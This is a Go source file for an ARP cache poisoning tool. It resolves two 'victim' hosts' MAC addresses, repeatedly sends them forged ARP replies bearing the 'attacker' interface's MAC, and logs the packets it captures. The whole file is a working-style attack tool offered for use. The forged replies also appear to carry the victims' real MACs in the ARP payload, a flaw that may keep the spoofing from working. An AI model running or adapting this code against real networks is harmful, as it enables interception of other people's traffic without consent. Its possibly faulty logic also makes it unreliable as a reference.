package main

import (
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func checkIPs(ips ...string) error {
	for _, ip := range ips {
		if net.ParseIP(ip) == nil {
			msg := ip + " not in the correct ipv4 format: x.x.x.x"
			return errors.New(msg)
		}
	}
	return nil
}

func ping(ips ...string) {
	var wg sync.WaitGroup

	for _, ip := range ips {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			fmt.Println("pinging ", ip)
			cmd := exec.Command("ping", ip)
			if err := cmd.Run(); err != nil {
				fmt.Println("failed to ping ", ip)
				return
			}
			fmt.Println("successfully pinged ", ip)
		}(ip)
	}

	wg.Wait()
}

type DeviceInfo struct {
	IP  string
	MAC string
}

func NewDeviceInfo(ip, mac string) *DeviceInfo {
	return &DeviceInfo{
		IP:  ip,
		MAC: mac,
	}
}

func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
	ping(ips...)

	var devices []*DeviceInfo

	data := exec.Command("arp", "-a")
	byteData, err := data.Output()
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(byteData), "\n")

	for _, ip := range ips {
		skip := false
		for _, line := range lines {
			if line[0] != ' ' {
				skip = true
				continue
			}
			if skip {
				skip = false
				continue
			}
			fields := strings.Fields(line)
			if ip == fields[0] {
				devices = append(devices, NewDeviceInfo(fields[0], fields[1]))
				break
			}
		}
	}

	return devices, nil
}

func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
	fromIP := net.ParseIP(from.IP)
	fromMAC, err := net.ParseMAC(from.MAC)
	if err != nil {
		return err
	}

	toMAC, err := net.ParseMAC(to.MAC)
	if err != nil {
		return err
	}

	toIP := net.ParseIP(to.IP)

	eth := layers.Ethernet{
		SrcMAC:       attackerInfo.MAC,
		DstMAC:       toMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	fmt.Fprintln(logFile, "eth: ", eth.SrcMAC, "-->", eth.DstMAC)

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   fromMAC,
		SourceProtAddress: fromIP,
		DstHwAddress:      toMAC,
		DstProtAddress:    toIP.To4(),
	}

	fmt.Fprintln(logFile, "arp: ", net.HardwareAddr(arp.SourceHwAddress).String(), "-->", net.IP(arp.SourceProtAddress).String(), "|", net.HardwareAddr(arp.DstHwAddress).String(), "-->", net.IP(arp.DstProtAddress).String())

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err = gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	if err = deviceHandle.WritePacketData(buf.Bytes()); err != nil {
		return err
	}

	return nil
}

func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
	dev1 := devicesInfo[0]
	dev2 := devicesInfo[1]

	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle, logFile); err != nil {
		return err
	}

	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle, logFile); err != nil {
		return err
	}

	return nil
}

type AttackerInfo struct {
	MAC net.HardwareAddr
	IP  net.IP
}

func getWindowsInterface(ifaceArg string) (string, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return "", err
	}

	devToAddrs := make(map[string][]pcap.InterfaceAddress)

	for _, device := range devices {
		devToAddrs[device.Name] = device.Addresses
	}

	iface, err := net.InterfaceByName(ifaceArg)
	if err != nil {
		return "", err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return "", err
	}

	for nameKey, addrsVal := range devToAddrs {
		for _, devAddr := range addrsVal {
			for _, addr := range addrs {
				if devAddr.IP.To4() != nil {
					if strings.Contains(addr.String(), devAddr.IP.String()) {
						return nameKey, nil
					}
				}
			}
		}
	}

	return "", errors.New("failed to find appropriate interface")
}

func getAttackerInfo(ifaceArg string) (*AttackerInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var info AttackerInfo
	for _, iface := range ifaces {
		if iface.Name == ifaceArg {
			info.MAC = iface.HardwareAddr
			addrs, err := iface.Addrs()
			if err != nil {
				return nil, err
			}

			for _, ip := range addrs {
				idx := strings.Index(ip.String(), "/")
				parsed := net.ParseIP(ip.String()[:idx])
				if parsed == nil {
					return nil, errors.New("failed to parse ip")
				}
				if parsed.To4() == nil {
					continue
				}
				info.IP = parsed
			}
		}
	}

	if info.IP == nil {
		return nil, errors.New("failed to obtain attacker's ip address")
	}

	return &info, nil
}

func readPackets(deviceHandle *pcap.Handle, log *os.File) {
	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())

	for packet := range packetSource.Packets() {
		fmt.Fprintln(log, packet.Dump())
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}
		arp := arpLayer.(*layers.ARP)
		fmt.Println(arp.Operation)
		fmt.Println("source mac: ", net.HardwareAddr(arp.SourceHwAddress).String())
		fmt.Println("source ip: ", net.IP(arp.SourceProtAddress).String())
		fmt.Println("dst mac: ", net.HardwareAddr(arp.DstHwAddress).String())
		fmt.Println("dst ip: ", net.IP(arp.DstProtAddress).String())
		fmt.Println()
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("usage: <interface> <victim1 ip> <victim2 ip>")
		os.Exit(0)
	}

	interfaceStr := os.Args[1]
	victim1IPStr := os.Args[2]
	victim2IPStr := os.Args[3]

	if err := checkIPs(victim1IPStr, victim2IPStr); err != nil {
		log.Fatal(err)
	}

	attackerInfo, err := getAttackerInfo(interfaceStr)
	if err != nil {
		log.Fatal(err)
	}

	device, err := getWindowsInterface(interfaceStr)
	if err != nil {
		log.Fatal(err)
	}

	deviceHandle, err := pcap.OpenLive(device, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer deviceHandle.Close()

	devicesInfo, err := mapIPstoMAC(victim1IPStr, victim2IPStr)
	if err != nil {
		log.Fatal(err)
	}

	endSignal := make(chan os.Signal, 1)
	signal.Notify(endSignal, syscall.SIGTERM, syscall.SIGINT)

	writeARPFile, err := os.Create("writeARP.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer writeARPFile.Close()

	readPacketsFile, err := os.Create("readPackets.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer readPacketsFile.Close()

	go func() {
		for sig := range endSignal {
			fmt.Println(sig.String(), "detected. ending program")
			close(endSignal)
			os.Exit(0)
		}
	}()

	go readPackets(deviceHandle, readPacketsFile)

	for {
		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle, writeARPFile); err != nil {
			log.Fatal(err)
		}
		time.Sleep(time.Second * 10)
	}
}
